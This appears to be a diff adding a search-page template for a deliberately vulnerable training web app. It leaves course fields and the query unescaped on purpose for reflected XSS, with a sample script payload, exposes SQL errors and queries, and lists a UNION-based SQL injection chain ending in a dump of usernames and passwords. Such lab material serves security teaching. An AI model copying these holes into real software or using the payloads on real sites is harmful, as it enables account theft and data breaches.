@@ -1,0 +1,44 @@
+<%- include('partials/header') %>
+<h3>Search courses</h3>
+<form method="GET" action="/search">
+  <div class="input-group mb-3">
+    <input class="form-control" name="q" value="<%= q %>" placeholder="e.g. Security">
+    <button class="btn btn-danger">Search</button>
+  </div>
+</form>
+
+<!-- VULNERABILITY #1: Reflected XSS -->
+<!-- `q` is injected with the UNESCAPED EJS tag <%- %> on purpose. -->
+<!-- Payload: <script>alert('Reflected XSS')</script> -->
+<p>Showing results for: <strong><%- q %></strong></p>
+
+<% if (sqlError) { %>
+  <div class="alert alert-warning">DB error (useful for SQLi probing): <%= sqlError %></div>
+<% } %>
+
+<div class="sql-trace mb-3"><%= lastSql %></div>
+
+<div class="row">
+  <% results.forEach(r => { %>
+    <div class="col-md-6 mb-3">
+      <div class="card">
+        <div class="card-body">
+          <h5 class="card-title"><%- r.title %></h5>
+          <p class="card-text small"><%- r.instructor %> — <%- r.description %></p>
+        </div>
+      </div>
+    </div>
+  <% }) %>
+</div>
+
+<div class="card mt-4"><div class="card-body small">
+  <strong>Advanced SQLi attack-chain hints (UNION-based):</strong>
+  <ol class="mb-0">
+    <li>Column count: <code class="payload">' ORDER BY 5-- -</code></li>
+    <li>Union probe: <code class="payload">' UNION SELECT 1,2,3,4-- -</code></li>
+    <li>Table enum: <code class="payload">' UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema=database()-- -</code></li>
+    <li>Column enum: <code class="payload">' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='users'-- -</code></li>
+    <li>Data dump: <code class="payload">' UNION SELECT 1,CONCAT(username,0x3a,password),3,4 FROM users-- -</code></li>
+  </ol>
+</div></div>
+<%- include('partials/footer') %>
